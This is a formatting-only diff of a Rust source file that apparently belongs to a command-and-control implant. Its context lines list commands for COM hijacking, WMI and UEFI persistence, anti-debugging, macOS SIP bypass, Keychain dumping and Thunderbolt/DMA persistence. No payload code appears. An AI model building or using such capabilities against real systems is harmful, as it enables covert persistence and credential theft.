@@ -1249,7 +1249,6 @@ pub enum Command {
     },
 
     // ── COM Object Hijacking (registry-free, activation context) ─────────
-
     /// Generate an SxS manifest XML for registry-free COM CLSID redirection.
     ///
     /// The manifest redirects COM resolution for a given CLSID to a proxy DLL
@@ -1325,7 +1324,6 @@ pub enum Command {
     },
 
     // ── WMI Permanent Subscriptions with Encrypted Cloud Payloads ─────────
-
     /// Install a WMI permanent event subscription that triggers a cloud-hosted
     /// payload.  Creates the WMI persistence triad (filter, consumer, binding).
     /// The consumer contains only a stager command — no shellcode or encrypted
@@ -1381,7 +1379,6 @@ pub enum Command {
     },
 
     // ── UEFI Firmware-Level Persistence ───────────────────────────────────
-
     /// Read a UEFI NVRAM variable.
     ///
     /// Cross-platform: uses `/sys/firmware/efi/efivars/` on Linux and
@@ -1500,7 +1497,6 @@ pub enum Command {
     },
 
     // ── Anti-Debug Hardening (macOS) ────────────────────────────────────────
-
     /// Actively deny future debugger attachment on macOS by calling
     /// `ptrace(PT_DENY_ATTACH)`.  This is a non-passive side-effect that
     /// prevents any subsequent debugger from attaching.  On non-macOS
@@ -1508,7 +1504,6 @@ pub enum Command {
     DenyDebuggerAttach,
 
     // ── macOS Post-Exploitation: TCC ────────────────────────────────────────
-
     /// Check TCC (Transparency, Consent, and Control) permission status for
     /// the current process on macOS.  Queries the system and user TCC
     /// databases for the specified resource.
@@ -1549,7 +1544,6 @@ pub enum Command {
     },
 
     // ── macOS Post-Exploitation: SIP ────────────────────────────────────────
-
     /// Check System Integrity Protection (SIP) status on macOS.
     /// Returns JSON with `status` (Enabled/Disabled/PartiallyDisabled/Unknown),
     /// `csrutil_output`, and `nvram_config`.
@@ -1566,7 +1560,6 @@ pub enum Command {
     MacSipBypassMount,
 
     // ── macOS Post-Exploitation: XPC ────────────────────────────────────────
-
     /// Enumerate XPC services on macOS that may be exploitable for privilege
     /// escalation.  Returns a JSON array of service objects with `name`,
     /// `mach_service_name`, `executable_path`, `bundle_path`, and `is_privileged`.
@@ -1586,7 +1579,6 @@ pub enum Command {
     },
 
     // ── macOS Post-Exploitation: Keychain ────────────────────────────────────
-
     /// Dump macOS Keychain entries using the `security` CLI.
     /// Returns a JSON array of keychain entries with `service`, `account`,
     /// `password` (if accessible), `entry_type`, `label`, and dates.
@@ -1598,7 +1590,6 @@ pub enum Command {
     MacKeychainDump,
 
     // ── Hardware Persistence: Thunderbolt / DMA ─────────────────────────────
-
     /// Detect Thunderbolt controller on the host.  Returns `null` if no
     /// controller found, otherwise JSON with `generation`, `security_level`,
     /// `firmware_version`, and `domains` information.
@@ -1652,7 +1643,6 @@ pub enum Command {
     },
 
     // ── Hardware Persistence: Boot ──────────────────────────────────────────
-
     /// Check whether the system boots via Legacy BIOS or UEFI mode.
     /// Returns JSON with `mode` ("Uefi" or "LegacyBios"), `secure_boot`
     /// status (UEFI only), and `description`.
@@ -2591,7 +2581,9 @@ mod tests {
             operator_id: None,
         };
         let bytes = bincode::serde::encode_to_vec(&msg, bincode::config::legacy()).unwrap();
-        let back: Message = bincode::serde::decode_from_slice(&bytes, bincode::config::legacy()).map(|(v, _)| v).unwrap();
+        let back: Message = bincode::serde::decode_from_slice(&bytes, bincode::config::legacy())
+            .map(|(v, _)| v)
+            .unwrap();
         match back {
             Message::TaskRequest {
                 task_id, command, ..
